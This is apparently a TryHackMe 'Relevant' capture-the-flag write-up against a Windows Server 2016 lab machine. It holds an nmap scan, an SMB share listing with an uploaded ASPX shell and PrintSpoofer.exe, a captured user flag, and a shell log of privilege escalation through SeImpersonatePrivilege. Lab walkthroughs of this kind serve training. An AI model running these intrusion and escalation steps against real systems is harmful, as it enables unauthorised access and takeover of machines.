# Relevant

```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ sudo nmap -sC -sV -Pn  10.10.53.236 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 12:26 CDT
Nmap scan report for 10.10.53.236
Host is up (0.20s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server?
|_ssl-date: 2024-04-24T17:45:11+00:00; +16m07s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-04-24T17:44:35+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-04-23T17:35:34
|_Not valid after:  2024-10-23T17:35:34
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-24T10:44:35-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m08s, deviation: 3h07m51s, median: 16m06s
| smb2-time: 
|   date: 2024-04-24T17:44:33
|_  start_date: 2024-04-24T17:36:32
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.72 seconds

```


```
──(melle㉿tuguldur)-[~/Downloads]
└─$ gobuster dir  -u http://10.10.242.103:49663 -w /usr/share/wordlists/dirb/common.txt -s '200,301' --no-error -t 50
Error: error on parsing arguments: status-codes ("200,301") and status-codes-blacklist ("404") are both set - please set only one. status-codes-blacklist is set by default so you might want to disable it by supplying an empty string.

```


*![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/79f6b167-9027-4b52-83de-d287d4690b49)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/b86807b1-d389-4dff-ab66-8b669bdd1473)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/c42d4371-32ff-4956-adb6-696d6b61c243)


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/fc2c8483-b052-4897-af03-d182e83a4147)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/acb339c2-e2fd-4add-a85a-6fd0ee92d77a)

```
c:\windows\system32\inetsrv>type c:\users\bob\desktop\user.txt
type c:\users\bob\desktop\user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}

```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4189e236-88b4-4fd0-97e2-1a682c8ddbd3)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/1caca648-3172-4c2a-8ff5-7a3c94f0c1bd)

### Privilege Escalation

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/c1cb769a-e689-48a4-8c8a-f5700cdc33ee)


```
smb: \> ls
  .                                   D        0  Wed Apr 24 13:02:09 2024
  ..                                  D        0  Wed Apr 24 13:02:09 2024
  passwords.txt                       A       98  Sat Jul 25 10:15:33 2020
  PrintSpoofer.exe                    A    27136  Wed Apr 24 13:02:11 2024
  relevant.aspx                       A     3413  Wed Apr 24 12:49:51 2024

		7735807 blocks of size 4096. 4945046 blocks available

```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/6d188ab8-42c1-4182-9807-7565ca29b502)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/90a7137f-d8fb-4bea-96d0-4bd5f2214860)


* ![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/61069455-b318-4fb2-957b-ed9675f98ab6)
* 
```
d ..
c:\Windows\System32>cd ..
cd ..cd ..
The system cannot find the path specified.

c:\Windows\System32>cd ..
cd ..

c:\Windows>cd /wwwroot
cd /wwwroot
The system cannot find the path specified.

c:\Windows>cd /www
cd /www
The system cannot find the path specified.

c:\Windows>cd www
cd www
The system cannot find the path specified.

c:\Windows>.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -i -c cmd
'.\PrintSpoofer.exe' is not recognized as an internal or external command,
operable program or batch file.

c:\Windows>cd system32\inetsrv>
cd system32\inetsrv>

c:\Windows>.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -i -c cmd
'.\PrintSpoofer.exe' is not recognized as an internal or external command,
operable program or batch file.

c:\Windows>cd c:\windows\system32\inetsrv
cd c:\windows\system32\inetsrv

c:\Windows\System32\inetsrv>.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -i -c cmd
'.\PrintSpoofer.exe' is not recognized as an internal or external command,
operable program or batch file.

c:\Windows\System32\inetsrv>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
'PrintSpoofer.exe' is not recognized as an internal or external command,
operable program or batch file.

c:\Windows\System32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\Windows\System32\inetsrv>cd c:\inetpub\wwwroot\nt4wrksv
cd c:\inetpub\wwwroot\nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/f4c7327e-125c-4615-9522-246a0cafeced)
finally i got the root flag
`THM{1f**********************345pv}`


























































